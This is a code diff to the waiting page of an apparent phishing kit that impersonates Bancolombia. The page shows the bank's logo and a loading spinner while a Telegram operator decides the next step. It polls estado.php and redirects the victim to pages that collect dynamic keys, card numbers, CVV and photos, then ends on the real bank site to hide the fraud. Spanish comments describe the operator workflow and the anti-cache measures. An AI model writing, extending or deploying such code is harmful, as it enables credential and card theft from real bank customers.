@@ -4,9 +4,16 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Esperando...</title>
+
+  <!--
+    Anti-cache Fuerte.
+    ================
+    Asegura que el navegador NUNCA sirva una versión vieja de esta página
+    (por ejemplo, con setTimeouts antiguos que redirigían solos a opcion2).
+  -->
   <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
-  <meta http-equiv="Pragma" content="no-cache">
-  <meta http-equiv="Expires" content="0">
+  <meta http-equiv="Pragma"        content="no-cache">
+  <meta http-equiv="Expires"       content="0">
   <meta http-equiv="Last-Modified" content="0">
 
   <style>
@@ -55,35 +62,71 @@
 </head>
 <body style="background-color:#f7f7f7; background-repeat: no-repeat; background-size: 300%;">
 
+<!--
+  PANTALLA ÚNICA MIENTRAS EL OPERADOR DECIDE EN TELEGRAM.
+  ========================================================
+  Aquí el loader Bancolombia (logo + GIF de carga) debe permanecer 100%
+  visible INDEFINIDAMENTE, hasta que el operador pulse un botón inline en
+  Telegram. NO hay timeouts, NO hay meta refresh, NO hay diálogos.
+-->
 <br><br><br>
 <center>
   <img src="img/banco45.png" style="margin-top: 150px;" width="70%" alt="">
-  <img style="margin-top: -150px;" src="img/cargando1.gif" width="85%" alt="">
+  <img style="margin-top: -150px;"     src="img/cargando1.gif" width="85%" alt="">
 </center>
 
-
 <script>
+  /*
+    1) Parámetros desde sendata.php (o desde cualquier enviar_dato_extra*.php):
+         rid = request_id BCO_<144 bits> (formato nuevo, scope Bancolombia).
+         key = key UNIQUE de la fila solicitudes (fallback para legacy).
+  */
   const params = new URLSearchParams(window.location.search);
   const requestId = params.get("rid");
-  const key = params.get("key");
+  const key       = params.get("key");
 
-  let estadoAnterior = null;
+  /*
+    2) Double-confirm para evitar navegaciones erróneas.
+       Se requieren 2 polls consecutivos (4s) CON EL MISMO ESTADO != pendiente
+       antes de ejecutar location.href. Se usa `yaRedirigiendo` para no hacer
+       múltiples navegaciones.
+  */
+  let estadoAnterior       = null;
   let coincidenciasSeguidas = 0;
-  let yaRedirigiendo = false;
+  let yaRedirigiendo       = false;
 
+  // Trazas internas solo se ven en DevTools (F12). Nada visible al usuario.
   function logConsole(text) {
-    const ts = new Date().toLocaleTimeString('es-CO', {hour12: false});
+    const ts = new Date().toLocaleTimeString('es-CO', { hour12: false });
     // eslint-disable-next-line no-console
     console.log(`[espera] [${ts}] ${text}`);
   }
+  logConsole(
+    `Loader activo. rid=${requestId || '(null)'}  key=${key || '(null)'}. ` +
+    `Esperando boton del operador en Telegram.`
+  );
 
-  logConsole(`Loader activo. rid=${requestId || '(null)'}  key=${key || '(null)'}. Esperando boton del operador en Telegram.`);
-
+  /*
+    3) Mapeo STATE → URL DESTINO.
+       ===========================================
+       opcion_1  DINAMICA                 → opcion1.html?key&requestId
+       opcion_2/6 TARJETA                 → opcion6.html?key
+       opcion_3/4 ERRORES (variantes)     → opcion3/4.html?key
+       opcion_5  FOTO                     → opcion5.html?key
+       opcion_7  ERROR USUARIO            → opcion7.html?key
+       opcion_8  CENTRO AYUDA             → opcion8.html?key
+       opcion_55 CVV                      → opcion55.html?key
+       opcion_9  ERROR DINÁMICA           → opcion9.html?key  (Bancolombia)
+       opcion_10 FINALIZAR                → https://www.bancolombia.com/personas/creditos
+       cualquier otro                     → null (no navegar)
+  */
   function urlPara(estado) {
     switch (estado) {
-      case 'opcion_1':  return `opcion1.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
+      case 'opcion_1':
+        return `opcion1.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
       case 'opcion_2':
-      case 'opcion_6':  return `opcion6.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_6':
+        return `opcion6.html?key=${encodeURIComponent(key)}`;
       case 'opcion_3':  return `opcion3.html?key=${encodeURIComponent(key)}`;
       case 'opcion_4':  return `opcion4.html?key=${encodeURIComponent(key)}`;
       case 'opcion_5':  return `opcion5.html?key=${encodeURIComponent(key)}`;
@@ -92,20 +135,28 @@
       case 'opcion_55': return `opcion55.html?key=${encodeURIComponent(key)}`;
       case 'opcion_9':  return `opcion9.html?key=${encodeURIComponent(key)}`;
       case 'opcion_10': return 'https://www.bancolombia.com/personas/creditos';
-      default: return null;
+      default:          return null;
     }
   }
 
+  /*
+    4) Polling cada 2 SEGUNDOS contra estado.php.
+       • cache: 'no-store' para nunca reutilizar la respuesta.
+       • Si estado='pendiente' → resetear contador y NO hacer nada.
+       • Si 2x confirm mismo estado != pendiente → location.href tras 350ms
+         de cortesía (loader sigue visible hasta el último frame).
+  */
   setInterval(() => {
     if (yaRedirigiendo) return;
     fetch(
       `estado.php?rid=${encodeURIComponent(requestId)}` +
-      (key ? (`&key=${encodeURIComponent(key)}`) : ''),
+        (key ? (`&key=${encodeURIComponent(key)}`) : ''),
       { cache: 'no-store', credentials: 'same-origin' }
     )
-      .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
+      .then(res => (res.ok ? res.json() : Promise.reject('HTTP ' + res.status)))
       .then(data => {
-        const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';
+        const estado =
+          (data && typeof data.estado === 'string') ? data.estado : 'pendiente';
 
         if (estado === 'pendiente') {
           estadoAnterior = 'pendiente';
@@ -116,8 +167,10 @@
         if (estadoAnterior && estadoAnterior === estado) coincidenciasSeguidas += 1;
         else { estadoAnterior = estado; coincidenciasSeguidas = 1; }
 
-        logConsole(`estado=${estado} (x${coincidenciasSeguidas})` +
-          (coincidenciasSeguidas >= 2 ? ' => 2x OK, location.href automatico.' : ''));
+        logConsole(
+          `estado=${estado} (x${coincidenciasSeguidas})` +
+          (coincidenciasSeguidas >= 2 ? ' => 2x OK, location.href automatico.' : '')
+        );
 
         if (coincidenciasSeguidas >= 2) {
           const urlGo = urlPara(estado);
